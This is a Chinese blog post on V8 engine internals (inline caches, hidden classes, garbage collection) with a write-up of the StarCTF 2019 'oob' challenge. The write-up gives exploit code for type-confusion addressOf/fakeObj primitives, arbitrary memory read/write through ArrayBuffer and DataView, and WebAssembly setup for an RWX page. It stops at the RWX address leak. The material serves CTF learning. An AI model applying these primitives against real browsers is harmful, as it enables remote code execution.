<h1 id="Inline-Cache"><a href="#Inline-Cache" class="headerlink" title="Inline Cache"></a>Inline Cache</h1><p><a class="link"   target="_blank" rel="noopener" href="https://v8.github.io/tools/v7.6/ic-explorer.html" >分析网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>对于确定的 map，我们可以知道 name property 所存储在 properties array 的位置。如果我们经过 JIT 生成的汇编里，<strong>函数</strong>所访问的 obj 的 map ，总是被我们缓存（cache) 的 map ，那么我们访问的 obj.X 的偏移永远是固定的。由此我们可以直接从 properties array 的固定偏移处取出我们想要的值 obj.X ，而不需要重新根据 map 检索 obj.X 所对应的偏移，从而可以加速。</p>
<h2 id="对象的隐藏类（Hidden-Class）"><a href="#对象的隐藏类（Hidden-Class）" class="headerlink" title="对象的隐藏类（Hidden Class）"></a>对象的隐藏类（Hidden Class）</h2><p>由于 JavaScript 对象没有类型信息，几乎所有 JS 引擎都采用隐藏类（Hidden Class&#x2F;Shape&#x2F;Map等）来描述对象的布局信息，用以在虚拟机内部区分不同对象的类型，从而完成一些基于类型的优化。</p>
<p>V8 对 JavaScript 对象都使用 HeapObject 来描述和存储，每一种 JavaScript 对象都是 HeapObject 的子类，而每个 HeapObject 都用 Map 来描述对象的布局。对象的 Map 描述了对象的类型，即成员数目、成员名称、成员在内存中的位置信息等。</p>
<h2 id="隐藏类变迁（Map-Transition）"><a href="#隐藏类变迁（Map-Transition）" class="headerlink" title="隐藏类变迁（Map Transition）"></a>隐藏类变迁（Map Transition）</h2><p>因为JavaScript是高度动态的程序设计语言，对象的成员可以被随意动态地添加、删除甚至修改类型。因此，对象的隐藏类在程序的运行过程中可能会发生变化，V8内部把这种变化叫隐藏类变迁（Map Transition）。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/1d41626cf74c223f3665480fbbf112b0.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="类型反馈向量（type-feedback-vector）"><a href="#类型反馈向量（type-feedback-vector）" class="headerlink" title="类型反馈向量（type feedback vector）"></a>类型反馈向量（type feedback vector）</h2><p>对于某代码语句比如 <code>this.x=x</code> ，比较上次执行到该语句时缓存的 Map 和对象当前的 Map 是否相同，如果相同则执行对应的 IC-Hit 代码，反之执行 IC-Miss 代码。V8 会在 Point 函数对象上添加一个名 <code>type_feedback_vector</code> 的数组成员，对于该函数中的每处可能产生 IC 的代码，Point 对象中的 <code>type_feedback_vector</code> 会缓存上一次执行至该语句时对象的 Map 和对应的 IC-Hit 代码（在 V8 内部称为 IC-Hit Handler ）。简单来说，<code>type_feedback_vector</code> 缓存了 Map 和与之对应的 IC-Hit handler ，这样 IC 相关的逻辑简化为只需要通过访问 <code>type_feedback_vector</code> 就可以判断是否 IC Hit 并执行对应的 IC-Hit Handler 。</p>
<h2 id="IC状态机"><a href="#IC状态机" class="headerlink" title="IC状态机"></a>IC状态机</h2><p>为了描述 V8 中 IC 状态的变化情况，本节将以状态机的形式描述 V8 中最常见 IC 种类的状态变化情况。V8 中最常用的 IC 分为五个状态，如图所示，初始为 uninitialized 状态，当发生一次 IC-Miss 时会变为 pre-monomorphic 态，再次 IC-Miss 会进入 monomorphic 态，如果继续 IC-Miss ，则会进入 polymorphic 状态。进入 polymorphic 之后如果继续 IC-Miss 3 次，则会进入megamorphic 态，并最终稳定在 megamophic 态。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e43ddd56d83ee56c3634e855f189d296.png"
                      alt="在这里插入图片描述"
                ></p>
<ul>
<li>初始为 uninitialized 状态，当发生一次 IC-Miss 时（由于 <code>type_feedback_vector</code> 为空，一定会 IC-Miss）会变为 pre-monomorphic 态。IC-Miss Handler 会分析出此时 obj 的 Map 中不包含添加的属性，因此会添加新成员，接着会发生 Map Transition 。由于考虑到大部分函数可能只会被调用一次，因此 V8 的策略是发生第一次 IC-Miss 时，并不会缓存此时的 map ，也不会产生 IC-Hit handler 。</li>
<li>再次 IC-Miss 会进入 monomorphic 态。由于 <code>type_feedback_vector</code> 仍然为空，因此会发生第二次 IC-Miss ，并将IC状态修改为 monomorphic ，此次 IC-Miss Hanlder 除了发生 Map Transition 之外，还会编译生成 IC-Hit Handler ，并将 map 和 IC Hit Handler 缓存到 <code>type_feedback_vector</code> 中。由于此次 IC-Miss Handler 需要编译 IC-Hit Handler 的操作比较耗时，因此第二次执行是最慢的。</li>
<li>第三次如果和上一次属性相同则 <code>type_feedback_vector</code> 不为空，且此时缓存的 map 与此时 obj 的 Map 也是一致的，因此会直接调用 IC-Hit Handler 来添加成员并进行 Map transition 。由于此次无需对 map 进行分析，也无需编译 IC-Hit Handler ，因此此时执行效率比前两次都高。</li>
<li>在 polymorphic 态 IC-Hit 时，需要对缓存进行线性查找。</li>
<li>IC状态太多比如到达 megamorphic 态，此时 Map 和 IC-Hit Handler 便不会再缓存在 obj 的 <code>type_feedback_vector</code> 中，而是存储在固定大小的全局 hashtable 中，如果 IC 态多于 hashtable 的大小，则会对之前的缓存进行覆盖。Megamorphic 是性能最低的 IC-Hit ，因为需要每次对 hashtable 进行查找，但是 megamorphic ic hit 性能仍然优于 IC-Miss 。</li>
</ul>
<h1 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h1><p>垃圾回收是⼀种在 V8 中单独管理 JavaScript 对象（称为 HeapObject ）的机制，其功能是检测废弃的对象并⾃动释放它们。</p>
<h2 id="GC-的空间划分"><a href="#GC-的空间划分" class="headerlink" title="GC 的空间划分"></a>GC 的空间划分</h2><p>GC 有两种主要的 Generation 。根据存活时间分为 Young 和 Old Generation 。除此之外，还有⼀些区域不属于任何⼀个 Generation ，它被写为 Other ，但是其实是 Large Object Space 。在源代码中，有些地方包含 Old Generation 的 large object space 的描述，但是基本上认为它们是不同的东西。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7b4e56651bde606a62ddf04a9ee02d08.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="Yong-Generation"><a href="#Yong-Generation" class="headerlink" title="Yong Generation"></a>Yong Generation</h2><h3 id="New-Space"><a href="#New-Space" class="headerlink" title="New Space"></a>New Space</h3><p>新创建的 object 除了code object，map object 和 large object 外都被保留在这里，并且受到 GC 管理。</p>
<p>GC 使用的算法是 Cheney’s algorithm ，在源码里被称为 Scavenge 。为了使用这种算法将 Young Generation 分为 From Space 和 To Space 两个区域。</p>
<h3 id="Cheney’s-algorithm"><a href="#Cheney’s-algorithm" class="headerlink" title="Cheney’s algorithm"></a>Cheney’s algorithm</h3><p>每⼀个对象最开始被放到 To Space 。</p>
<p>当 memory exhaustion（空间用完）时候，GC 被调用。主线程的操作( Javascript 执行的线程)被暂停。交换To Space 和 From Space 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/bd2fa5cad07aa2c49e840d27a3d06d3e.png"
                      alt="在这里插入图片描述"
                ><br>之后会把存活的对象复制到 To Space ，然后再次分配之前未分配完成的 obj-e 。这里判断存活 obj 的方法是从各种各样的 root objects (例如 global objects, built-in objects, local objects within the scope of living 等）和从 Old Space 可以访问的 object (Write Barrier mechanism）沿指针遍历出所有存活的 obj 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e1557fa97f7e301249cd965b402054f1.png"
                      alt="在这里插入图片描述"
                ><br>之后，每次GC发生时，都会重复上面这⼀系列的流程。</p>
<h2 id="Old-Generation"><a href="#Old-Generation" class="headerlink" title="Old Generation"></a>Old Generation</h2><h3 id="old-space"><a href="#old-space" class="headerlink" title="old space"></a>old space</h3><p>长期存活对象存放的区域，例如 New Space 中，在两次 GC 之后存活下来的 object ，具体参考 <code>Heap::ShouldBePromoted()</code> 。</p>
<p>old space 发生 GC 的频率比 new space 少，因此如果⼀个 object 被移动到 old space ，该 object 不会受到 GC 更改 layout 的影响。</p>
<h3 id="code-space"><a href="#code-space" class="headerlink" title="code space"></a>code space</h3><p>仅适用于 JIT 的 code object ，由于 code object 是 RWX ，因此它从一开始就保留在此区域中，由于它是JIT代码，因此不仅要读取（R）写⼊（W），还要执行（X），因此 memory permissions 与其他的地方不同。</p>
<h3 id="map-space"><a href="#map-space" class="headerlink" title="map space"></a>map space</h3><p>仅存放 Map object ，出于 GC 效率的考虑，Map object 从一开始就位于此区域。</p>
<h3 id="Mark-Sweep-Compact"><a href="#Mark-Sweep-Compact" class="headerlink" title="Mark-Sweep-Compact"></a>Mark-Sweep-Compact</h3><p>old generation 的 GC 算法是 Mark-Sweep-Compact ，即标记-清除-整理算法。</p>
<h2 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h2><p>即 Large Object Space ，用于存放 600KB 或更大的 object 的区域。它由 mmap 直接分配，如果有多个存放区域，则使用链表进行管理。它不在GC中移动。</p>
<h2 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h2><p>写屏障是⼀种减少时间开销的机制。</p>
<p>当 GC 想回收新生代中的内容的时候，如果此时有一个对象，且这个对象恰好被一个老年代所引用，那么这个时候，如果想回收这个对象，就需要去遍历老年代，这样开销比较大。</p>
<p>所以就引入了记录集，在更新对象的时候有个记录集，这个记录集内记录了所有老年代指向新生代的情况，即记录集里保存的实际上是指向老年代对象的指针。</p>
<p>在新生代中触发 GC 的时候，会将记录集里的老年代对象也当成根对象⼀样，扫描记录集，查看记录集里老年代对象引用的目标对象，进而更新引用的目标对象，再将发出引用的对象的指针更新到目标空间了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7d32f6a090435f50b55c8bd2e7a8968d.png"
                      alt="在这里插入图片描述"
                ><br>在分代垃圾回收中，为了将老年代对象记录到记录集⾥，我们引⼊了写入屏障（write barrier）的概念。<br>在更新对象间的指针时候检查如下三点：</p>
<ul>
<li>发出引用的对象是不是老年代对象</li>
<li>指针更新后的引用的目标对象是不是新生代对象</li>
<li>发出引用的对象是否还没有被记录到记录集中</li>
</ul>
<p>如果这些条件都满足，就将老年代对象 obj 写入到记录集里。</p>
<h1 id="例题：StarCTF-2019-OOB"><a href="#例题：StarCTF-2019-OOB" class="headerlink" title="例题：StarCTF 2019 OOB"></a>例题：StarCTF 2019 OOB</h1><p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/starctf2019_oob" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>v8 commit:<code>6dc88c191f5ecc5389dc26efa3ca0907faef3598</code></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>观察 <code>oob.diff</code> 发现增加了如下功能，即任意数组可以以浮点数类型越界读写 8 字节。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">BUILTIN</span>(ArrayOob)&#123;</span><br><span class="line">    <span class="type">uint32_t</span> len = args.<span class="built_in">length</span>();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">            isolate, receiver, Object::<span class="built_in">ToObject</span>(isolate, args.<span class="built_in">receiver</span>()));</span><br><span class="line">    Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(receiver);</span><br><span class="line">    FixedDoubleArray elements = FixedDoubleArray::<span class="built_in">cast</span>(array-&gt;<span class="built_in">elements</span>());</span><br><span class="line">    <span class="type">uint32_t</span> length = <span class="built_in">static_cast</span>&lt;<span class="type">uint32_t</span>&gt;(array-&gt;<span class="built_in">length</span>()-&gt;<span class="built_in">Number</span>());</span><br><span class="line">    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="comment">//read</span></span><br><span class="line">        <span class="keyword">return</span> *(isolate-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewNumber</span>(elements.<span class="built_in">get_scalar</span>(length)));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//write</span></span><br><span class="line">        Handle&lt;Object&gt; value;</span><br><span class="line">        <span class="built_in">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(</span><br><span class="line">                isolate, value, Object::<span class="built_in">ToNumber</span>(isolate, args.<span class="built_in">at</span>&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">        elements.<span class="built_in">set</span>(length,value-&gt;<span class="built_in">Number</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">ReadOnlyRoots</span>(isolate).<span class="built_in">undefined_value</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="泄露-Map"><a href="#泄露-Map" class="headerlink" title="泄露 Map"></a>泄露 Map</h2><p>调试发现 <code>JSArray</code> 在内存中的结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/27e98fd1fed5dfb781c688b57cddb7eb.png"
                      alt="在这里插入图片描述"
                >因此可以通过 <code>oob</code> 泄露 <code>Map</code> 地址。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.<span class="title function_">oob</span>();</span><br><span class="line"><span class="keyword">var</span> object_array_map = object_array.<span class="title function_">oob</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] float array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(float_array_map)));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(<span class="title function_">d2u</span>(object_array_map)));</span><br></pre></td></tr></table></figure></div>

<h2 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h2><p>通过 <code>oob</code> 修改 <code>Map</code> 构造实现浮点数数组和 objec t数组的类型混淆，进而构造 <code>addressOf</code> 和 <code>fakeObj</code> 两个利用原语。</p>
<ul>
<li><code>addressOf</code>：传入一个 object ， 返回它的地址，实现对任意 object 的地址泄漏。</li>
<li><code>fakeObj</code>：传入一个地址，我们把这个地址指向的内存当做一个 object ， 并将它返回。实现对任意 object 的伪造。</li>
</ul>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">addressOf</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    float_array[<span class="number">0</span>] = obj;</span><br><span class="line">    float_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(float_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fakeObj</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    object_array.<span class="title function_">oob</span>(float_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr | <span class="number">1n</span>);</span><br><span class="line">    object_array.<span class="title function_">oob</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> object_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h2><p>任意地址读写如果用 <code>DoubleArray</code> 实现会有如下问题：</p>
<ul>
<li>在数组进行元素访问时，它会和这个堆的基地址做一个 mask 的操作，保证了这个 <code>elements</code> 指针指向的内存段时属于 v8 的堆的范围。</li>
<li>在对伪造的浮点数数组进行操作的时候，触发了收集 Inline Cache 的函数，导致 SIGTRAP 。</li>
<li><code>DoubleArray</code> 构造的任意地址读写只能读写 <code>elements + 0x10</code> ，并且还会访问 <code>[elements, elements + 0x10)</code> 范围内的数据，而如果是在 rwx 段写 shellcode 需要从起始位置开始写，因此不能用 <code>DoubleArray</code> 构造的任意地址读写完成。</li>
</ul>
<p>因此这里需要使用 <code>ArrayBuffer</code> 和 <code>DataView</code> 来构造任意地址读写。这里介绍两种方法：</p>
<ul>
<li><p>伪造 <code>DoubleArray</code> 进行一次任意地址写修改一个 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 指向另一个 <code>ArrayBuffer</code> 的 <code>BackingStore</code> ，之后每次任意地址读写都可以先用一个 <code>ArrayBuffer</code> 改另一个 <code>ArrayBuffer</code> 的 <code>BackingStore</code> 然后利用另一个 <code>ArrayBuffer</code> 进行任意地址读写。 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/7729391b287f656bbc54f9168026d770.png"
                      alt="在这里插入图片描述"
                ><br>需要注意的是伪造的 <code>DoubleArray</code> 的 <code>Length</code> 字段是一个 <code>Smi</code> 类型，需要右移 32 位。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab1 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">var</span> ab2 = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> dv1 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab1);</span><br><span class="line"><span class="keyword">var</span> dv2 = <span class="keyword">new</span> <span class="title class_">DataView</span>(ab2);</span><br><span class="line"><span class="keyword">var</span> ab1_bs_addr = <span class="title function_">addressOf</span>(ab1) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="keyword">var</span> ab2_bs_addr = <span class="title function_">addressOf</span>(ab2) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> float_array_mem = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_">u2d</span>(ab1_bs_addr - <span class="number">0x10n</span>),</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x100000000n</span>),</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">fake_float_array = <span class="title function_">fakeObj</span>(<span class="title function_">addressOf</span>(float_array_mem) + <span class="number">0x30n</span>);</span><br><span class="line">fake_float_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(ab2_bs_addr - <span class="number">1n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    dv1.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, address, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv2.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>首先在 <code>DoubleArray</code> 中构造一个 <code>fake ArrayBuffer</code>，之后就可以通过 <code>DoubleArray</code> 修改 <code>BackingStore</code> 指针来进行任意地址读写。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/a37f64a6db55de364bcd5330b6b1aa84.png"
                      alt="在这里插入图片描述"
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_ab_mem = [</span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Propertries</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Elements</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1000n</span>),               <span class="comment">// ByteLength</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// BackingStore</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0n</span>),                    <span class="comment">// Map</span></span><br><span class="line">    <span class="title function_">u2d</span>(<span class="number">0x1900042319080808n</span>),   <span class="comment">// type</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_ab_addr = <span class="title function_">addressOf</span>(fake_ab_mem) + <span class="number">0x58n</span>;</span><br><span class="line">fake_ab_mem[<span class="number">0</span>] = <span class="title function_">u2d</span>(fake_ab_addr + <span class="number">0x28n</span>);</span><br><span class="line"><span class="keyword">var</span> fake_ab = <span class="title function_">fakeObj</span>(fake_ab_addr);</span><br><span class="line"><span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="title class_">DataView</span>(fake_ab);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">address</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">address, value</span>) &#123;</span><br><span class="line">    fake_ab_mem[<span class="number">4</span>] = <span class="title function_">u2d</span>(address);</span><br><span class="line">    <span class="keyword">return</span> dv.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h2 id="劫持程序执行流程"><a href="#劫持程序执行流程" class="headerlink" title="劫持程序执行流程"></a>劫持程序执行流程</h2><h3 id="利用-WebAssembly-写-shellcode"><a href="#利用-WebAssembly-写-shellcode" class="headerlink" title="利用 WebAssembly 写 shellcode"></a>利用 WebAssembly 写 shellcode</h3><p>利用 <code>WebAssembly</code> 开辟 rwx 段。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_mod = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code));</span><br><span class="line"><span class="keyword">let</span> f = wasm_mod.<span class="property">exports</span>.<span class="property">main</span>;</span><br></pre></td></tr></table></figure></div>
<p>上面这段 <code>WebAssembly</code> 代码对应的 <code>wat</code> 代码如下，是通过<a class="link"   target="_blank" rel="noopener" href="https://webassembly.github.io/wabt/demo/wasm2wat/index.html" >这个网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>反编译得到的。</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title function_ invoke__">module</span></span><br><span class="line">  (type <span class="variable">$t0</span> (<span class="title function_ invoke__">func</span> (result i32)))</span><br><span class="line">  (func <span class="variable">$main</span> (export <span class="string">&quot;main&quot;</span>) (type <span class="variable">$t0</span>) (result i32)</span><br><span class="line">    (i32.<span class="keyword">const</span> <span class="number">42</span>))</span><br><span class="line">  (table <span class="variable">$T0</span> <span class="number">0</span> funcref)</span><br><span class="line">  (memory <span class="variable">$memory</span> (export <span class="string">&quot;memory&quot;</span>) <span class="number">1</span>))</span><br></pre></td></tr></table></figure></div>
<p>利用任意地址读泄露 rwx 段基址。</p>
